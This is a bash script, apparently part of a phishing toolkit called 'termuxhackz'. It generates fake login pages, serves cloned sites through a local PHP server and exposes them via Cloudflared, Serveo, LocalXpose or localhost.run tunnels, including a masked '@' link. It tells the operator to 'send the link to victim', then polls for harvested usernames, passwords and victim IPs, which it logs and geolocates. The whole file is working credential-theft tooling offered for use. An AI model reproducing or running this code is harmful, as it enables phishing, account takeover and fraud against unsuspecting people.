echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<head>" >> sites/create/login.html
printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
IFS=$'\n'
printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
IFS=$'\n'
printf '<link rel="stylesheet" href="style.css"/>' >> sites/create/login.html
IFS=$'\n'
printf '<link rel="stylesheet" href="cookieconsent.min.css"/>' >> sites/create/login.html
IFS=$'\n'
printf '  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>' >> sites/create/login.html
IFS=$'\n'
printf '  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>' >> sites/create/login.html
IFS=$'\n'
  printf '<!-- Add boot strap framrworks -->' >> sites/create/login.html
  IFS=$'\n'
  	printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">' >> sites/create/login.html
  	IFS=$'\n'
printf '<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="./style.css">' >> sites/create/login.html
IFS=$'\n'
  printf '<!-- Add icon library -->' >> sites/create/login.html
  IFS=$'\n'
printf '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">' >> sites/create/login.html
IFS=$'\n'
echo "</head>" >> sites/create/login.html
printf '<body bgcolor="gray" text="white">' >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Awaiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
checkfound
}
checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Start Cloudflared
start_cloudflared3() { 
      rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; smallbanner; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	echo -e "\n if you do not see any link kindly report to me at AnonyminHack5@protonmail.com.\n"
	datafound
}

server003() {
    smallbanner
            if [[ -e sites/$website/ip.txt ]]; then
                rm -rf sites/$website/ip.txt

            fi

            if [[ -e sites/$website/usernames.txt ]]; then
                rm -rf sites/$website/usernames.txt

            fi

            if [[ -e xtermtunnel ]]; then
                rm xtermtunnel

            fi
            if [[ -e xtermflared ]]; then
                rm xtermflared

            fi

            # if [[ -e webpage/credentials.txt ]]; then
            # echo '-----------------------------------/n' >> webpage/credentials.txt

            # else
            # echo '1' >> webpage/credentials.txt

            # fi

        printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
        cd sites/$website && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 127.0.0.1:5555" > /dev/null 2>&1 &
        sleep 5
        printf "${BGreen}OK.${clear}\n"
        printf "${Yellow}Starting ${BGreen}Cloudflared ${Green}server "
        xterm -hold -geometry 90x26+1000+1000 -l -lf xtermflared -T "Cloudflared server ☣" -e "cloudflared tunnel --url 127.0.0.1:5555" > /dev/null 2>&1 & 
        sleep 5
        printf "${BGreen}OK.${clear}\n\n"
        sleep 3
        # tnnl="(cat xtermflared | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')"
        #clink=cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:5555"  
        printf "\n\n"
        printf "${BYellow}Your URL is:${BGreen} "&& cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
        printf "\n"
        sleep 2
            if [[ -e sites/$website/credentials.txt ]]; then
                printf "Website: $site \n\n" > sites/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f sites/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            else
                printf '0' > sites/$website/credentials.txt
                printf "Website: $site \n\n" > sites/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f sites/credentials.txt' > /dev/null 2>&1 &
                sleep 1
				echo -e "\n if you do not see any link kindly report to me at AnonyminHack5@protonmail.com.\n"

            fi
			datafound
}
tunnel_menu() {

if [[ -e .nexlink ]]; then
rm -rf .nexlink
fi

if [[ -d .termuxhackz/www ]]; then
rm -rf .termuxhackz/www
mkdir .termuxhackz/www
else
mkdir .termuxhackz/www
fi

cp -rf sites/$website/* .termuxhackz/www
cp -f sites/ip.php .termuxhackz/www/

def_tunnel_menu="2"
smallbanner
printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m CloudFlare  1 \e[0m\e[91m[\e[0m\e[93mNEW - LINUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m06\e[0m\e[91m]\e[0m\e[93m CloudFlare 2 \e[0m\e[91m[\e[0m\e[93mNEW - TERMUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
printf "\e[0m\e[91m [\e[0m00\e[0m\e[91m]\e[0m\e[93m Go Back\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_localhost
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_serveo
elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
start_loclx
elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
start_localhostrun
elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
start_cloudflare
elif [[ $tunnel_menu == 6 || $tunnel_menu == 06 ]]; then
start_cloudflare2
elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
go_back

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
clear
banner
menu
fi

}
go_back() {
	clear
	banner
	menu
}
start_cloudflare2() {
	echo "${RED}[${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
	sleep 1
	start_cloudflared3
	}
start_cloudflare() {
	echo "${RED}[${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
	sleep 1
	server003
}

start_localhost() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 1
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at:\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"

datafound

}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;96m %s \e[0m\e[1;91m )\e[0m\e[1;92m : \e[0m\e[1;93m' $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m)\e[0m\e[1;92m: \e[0m\e[1;93m' $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:$serveo_port\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 5

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 5
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $serveo_link

datafound
}

start_loclx() {

loclx_default_choose_sub="Y"
loclx_default_sub="$website$RANDOM"

printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
read loclx_choose_sub
loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
loclx_custom_subdomain=true
sleep 1
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
read loclx_subdomain
loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
sleep 1
fi

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
if [[ $loclx_custom_subdomain == true ]]; then

./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &

sleep 5

else
./.termuxhackz/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
sleep 5
fi
loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
smallbanner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link

datafound
}

start_localhostrun() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
cd .termuxhackz/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run

printf "\e[0m\n"

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
printf "\e[0m\n"
while [ true ]; do


if [[ -e ".termuxhackz/www/ip.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' .termuxhackz/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .termuxhackz/www/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .termuxhackz/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
rm -rf .termuxhackz/www/usernames.txt
fi
sleep 0.75

done

}

grab_ip() {

ip=$(grep -a 'IP:' .termuxhackz/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
printf "\n"
cat .termuxhackz/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .termuxhackz/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .termuxhackz/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat .termuxhackz/www/usernames.txt >> logs/$website.log
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
printf "\n"
printf " \e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\e[1;96m If you dont see account info, Go to the saved logs and use cat command to view it \e[0m\e[1;31m[\e[0m\e[1;93m!\e[0m\e[1;31m]\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do


if [[ -e ".termuxhackz/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
grab_ip
rm -rf .termuxhackz/www/ip.txt
fi
sleep 0.75
if [[ -e ".termuxhackz/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
grab_creds
rm -rf .termuxhackz/www/usernames.txt
fi
sleep 0.75


done 

}

banner
dependencies
install_cloudflared
menu


